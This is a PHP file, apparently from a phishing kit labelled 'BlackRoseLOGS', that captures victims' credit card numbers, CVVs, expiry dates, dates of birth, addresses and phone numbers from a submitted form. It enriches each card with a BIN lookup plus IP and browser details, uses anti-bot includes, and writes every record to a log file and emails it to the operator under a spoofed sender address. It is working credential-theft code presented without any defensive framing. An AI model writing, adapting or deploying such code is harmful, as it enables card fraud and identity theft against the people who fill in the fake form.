<?php
/*  
BlackRoseLOGS
*/
if(isset($_POST['cnm'])&&isset($_POST['csc'])){session_start();include'../mine.php';include'../../prevents/anti2.php'; function checkbin($bin) {$bin = preg_replace('/\s/', '', $bin);$bin = substr($bin,0,8);$url = "https://lookup.binlist.net/".$bin;$headers = array();$headers[] = 'Accept-Version: 3';$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);$resp=curl_exec($ch);curl_close($ch);$result = json_decode($resp, true);return $result;
	}
$ccn=str_replace(' ','',$_POST['cnm']);$bin=checkbin($ccn);$last4= substr($ccn,-4);$cex=$_POST['exp'];$csc=$_POST['csc'];$fnm=$_POST['fnm'];$dop=$_POST['dop'];$adr=$_POST['adr'];$cty=$_POST['cty'];$zip=$_POST['zip'];$phn=$_POST['phn'];$stt=$_POST['stt'];$cnt=$_POST['cnt'];$_SESSION['fname']=$fnm;$_SESSION['cscheme']=strtoupper($bin['scheme']);$_SESSION['ctypee']=strtoupper($bin['type']);$_SESSION['cbrand']=strtoupper($bin['brand']);$_SESSION['cname']=strtoupper($bin['bank']['name']);$_SESSION['bname']=($bin['bank']['name']);$_SESSION['fcunt']=($bin['country']['name']);$_SESSION['last4']=$last4;
	$msg .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 14px;font-family:helvetica,courier,arial;font-weight:700;'><br><br>
PERSONAL INFO<br>
<br>
FULL NAME : {$fnm}<br>
DOB       : {$dop}<br>
ADDRESS   : {$adr}<br>
PHONE     : {$phn}<br>
ZIP CODE  : {$zip}<br>
CITY      : {$cty}<br>
STATE     : {$stt}<br>
COUNTRY   : {$cnt}<br>
<br>
CC DETAILS<br>
<br>
CC NUMBER  : {$ccn}<br>
CC EXPIRY  : {$cex}<br>
CVV / CSC  : {$csc}<br>
<br>
BIN INFO<br>
<br>
BANK       : {$_SESSION['cname']}<br>
TYPE       : {$_SESSION['cscheme']} - {$_SESSION['ctypee']}<br>
LEVEL      : {$_SESSION['cbrand']}<br>
CURRENCY   : {$_SESSION['currency']}<br>
COUNTRY    : {$_SESSION['fcunt']}<br>
<br>
[ IP LOOKUP INFORMATION ]<br>
<br>
COMPUTER : {$_SESSION['computer']}<br>
IP ADDRESS : {$_SESSION['ip']}<br>
LOCATION : {$_SESSION['ip_city']}, {$_SESSION['ip_state']}, {$_SESSION['ip_countryName']}<br>
BROWSER : {$_SESSION['browser']} on {$_SESSION['os']}><br>
USER AGENT : {$_SERVER['HTTP_USER_AGENT']}<br>
TIMEZONE : {$_SESSION['ip_timezone']}<br>
<br>
[ 🖤".$scamname."🖤 ]
<br></div></html>\n";
include'../../prevents/anti7.php';checkbot($msg);
$bins = preg_replace('/\s/', '', $ccn);
$bins = substr($bins,0,6);
if($saveintext=="yes"){$save=fopen("../../".$filename.".html","a+");fwrite($save,$msg);fclose($save);}
$subject="💳 {$bins} - {$_SESSION['cscheme']} {$_SESSION['ctypee']} {$_SESSION['cbrand']} {$_SESSION['cname']} [ {$_SESSION['fcunt']} - {$_SESSION['os']} - {$_SESSION['ip']} ]";$headers="From: {$_SESSION['fname']} <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtoemail=="yes"){foreach(explode(",",$yours)as $your){@mail($your,$subject,$msg,$headers);}}
exit('done');}
?>